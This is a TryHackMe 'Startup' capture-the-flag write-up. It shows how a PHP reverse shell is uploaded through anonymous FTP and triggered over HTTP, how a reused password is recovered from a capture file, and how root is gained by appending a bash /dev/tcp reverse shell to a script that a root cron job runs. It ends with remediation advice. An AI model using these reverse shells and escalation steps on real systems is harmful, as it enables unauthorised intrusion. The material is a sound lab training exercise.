# TryHackMe — Startup

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 16.04) |
| **Date** | 2026-11-24 |
| **Skills** | Anonymous FTP with write access, PHP reverse shell, file exfiltration, PCAP analysis with Wireshark, credential reuse, cron job privilege escalation |

> Flags, the recipe answer and the recovered password are redacted, following TryHackMe's write-up guidelines.

## Summary

An anonymous FTP share has a **world-writable folder that is also served by the web server**, so uploading a PHP reverse shell gives a shell as `www-data`. A capture file in `/incidents` records an earlier intruder doing the same thing, and in it the intruder types **lennie's password** at a `sudo` prompt. With that password, SSH as lennie works. lennie can edit `/etc/print.sh`, a script that a **root-owned script run by cron** calls, so a one-line bash reverse shell added to it returns as root.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
nmap -sV -sC -p 21,22,80 -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | Anonymous login; directory `ftp` flagged by nmap as **[NSE: writeable]** |
| 22 | OpenSSH 7.2p2 (Ubuntu) | |
| 80 | Apache 2.4.18 (Ubuntu) | Title "Maintenance" |

## 2. FTP

```
ftp> ls -la
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

`notice.txt` complains about Among Us memes left on the share and says *"People downloading documents from our website…"* and *"Maya is looking pretty sus"*. Two leads: the share is probably **exposed through the website**, and **maya** might be a username.

The `ftp` subfolder is `drwxrwxrwx`, which means anyone can write to it.

## 3. Web

The home page is a maintenance notice with an HTML comment asking when it will be updated. Gobuster:

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -o web.txt
```

```
files                (Status: 301) [--> http://<TARGET>/files/]
index.html           (Status: 200)
server-status        (Status: 403)
```

`/files/` lists the same content as the FTP share. Put together: **upload over FTP → run it over HTTP**.

I briefly thought about looking for Apache 2.4.18 CVEs, but bugs in Apache itself rarely lead to code execution. Using what had already been found was the faster route.

## 4. Initial access — PHP reverse shell via FTP

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/thm/startup/
# edit: $ip = '<MY_TUN0_IP>'; $port = 1234;
```

```
ftp> put php-reverse-shell.php
553 Could not create file.          # the FTP root isn't writable
ftp> cd ftp
ftp> put php-reverse-shell.php      # the world-writable folder is
```

```bash
nc -lvnp 1234
# then browse to http://<TARGET>/files/ftp/ and click the file
```

```
connect to [<MY_TUN0_IP>] from (UNKNOWN) [<TARGET>] 46100
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`/recipe.txt` (owned by www-data) answers the "secret recipe" question.

## 5. Enumeration as www-data

- `/home/lennie` exists but isn't readable.
- `sudo -l` asks for www-data's password, which we don't have.
- **SUID binaries:** all standard (`su`, `sudo`, `passwd`, `mount`, `ping`, `pkexec`, helpers under `/usr/lib`). `pkexec` on a 2020 Ubuntu is very likely vulnerable to **PwnKit (CVE-2021-4034)**, which would give root straight away. I deliberately didn't use it: it skips the intended path, and kernel/system exploits are a last resort on real engagements because they can crash the host.
- **`/incidents/suspicious.pcapng`**, a network capture in a world-readable folder.

### Exfiltrating the capture

The FTP folder works in both directions. Copy the file into the web/FTP folder, then download it from Kali:

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp
```

```
ftp> cd ftp
ftp> get suspicious.pcapng
```

## 6. PCAP analysis — credentials from the earlier intrusion

In Wireshark, *Statistics → Conversations* and then *Follow → TCP Stream* show the earlier intrusion step by step.

1. An HTTP request triggering **`GET /files/ftp/shell.php`**. Someone else used exactly the same upload trick.
2. That shell's session. The intruder upgrades the TTY, fails to `cd` into `/home/lennie`, and runs `sudo -l`:

```
www-data@startup:/home$ sudo -l
[sudo] password for www-data:
<redacted>
Sorry, try again.
...
sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
...
lennie:x:1002:1002::/home/lennie:
```

The password is wrong for `www-data`, but the intruder was clearly after lennie. It's worth trying it for that account.

## 7. Lateral movement — SSH as lennie

```bash
ssh lennie@<TARGET>
```

It works. `user.txt` is in lennie's home. lennie has no sudo rights.

```
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
```

## 8. Privilege escalation — cron + writable script

```bash
cat ~/scripts/planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

| File | Owner | Why it matters |
|---|---|---|
| `~/scripts/planner.sh` | root | Run periodically by root (cron) |
| `/etc/print.sh` | **lennie** | Called by `planner.sh`, but **lennie can edit it** |

`/etc/print.sh` only did `echo "Done!"`. Whatever goes into it runs **as root** the next time cron fires `planner.sh`. You can confirm that the job is running by watching the modification time of `startup_list.txt` (`ls -la --time-style=full-iso`), or catch it live with **pspy**. I didn't measure the exact interval.

I appended a bash reverse shell to `/etc/print.sh`:

```bash
bash -i >& /dev/tcp/<MY_TUN0_IP>/4444 0>&1
```

- `/dev/tcp/IP/PORT` is a bash feature that opens a TCP connection.
- `>&` sends stdout and stderr down that connection.
- `0>&1` reads stdin from it too.

```bash
nc -lvnp 4444    # port 1234 was still busy with the www-data shell
```

```
connect to [<MY_TUN0_IP>] from (UNKNOWN) [<TARGET>] 58918
root@startup:~# whoami
root
```

`root.txt` is in `/root`. **Clean-up:** I then removed the reverse shell line from `/etc/print.sh` to leave the box as I found it.

## Attack chain

```
nmap → anonymous FTP with writable "ftp" folder + website /files/
     → PHP reverse shell uploaded via FTP, triggered via HTTP → www-data
     → /incidents/suspicious.pcapng → exfiltrated through the same folder
     → Wireshark: earlier intruder typed lennie's password → SSH as lennie
     → root cron runs planner.sh → calls /etc/print.sh (writable by lennie)
     → bash reverse shell in print.sh → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Anonymous FTP with a world-writable folder | Disable anonymous uploads; never allow writes to a share the web server serves |
| Web server executes PHP from the upload folder | Serve shared files from outside the web root, or disable script execution there |
| Incident capture left on the compromised host, readable by www-data | Keep forensic evidence off the affected system and restrict access to it |
| Password reuse and passwords typed into the wrong prompts | Unique passwords, key-based SSH, and rotating any credential seen in an incident |
| Root cron job calls a script that a normal user can edit | Every file a root job runs must be owned by root and not writable by others; use absolute paths and audit `/etc/cron*` |
| Old system (Ubuntu 16.04, vulnerable pkexec) | Patch, or upgrade off an end-of-life OS |

## Lessons learned

- **Link the services together.** On its own the FTP share was harmless and `/files/` was harmless. Together they meant code execution.
- **Use what you've already found before chasing version CVEs.** Apache 2.4.18 would have been a rabbit hole.
- **Telling normal SUIDs from odd ones:** standard system binaries and `/usr/lib` helpers are expected. Interpreters, editors, custom names, and anything in `/opt`, `/home` or `/usr/local` are not.
- **Wireshark basics:** *Statistics → Conversations* to see who talks to whom, *Follow → TCP Stream* to read a whole session, and display filters to narrow things down.
- **Cron escalation pattern:** a script owned by root that calls something you can write to. Check ownership along the whole call chain, not only the first script.
- **Clean up after yourself:** remove payloads once you've finished.
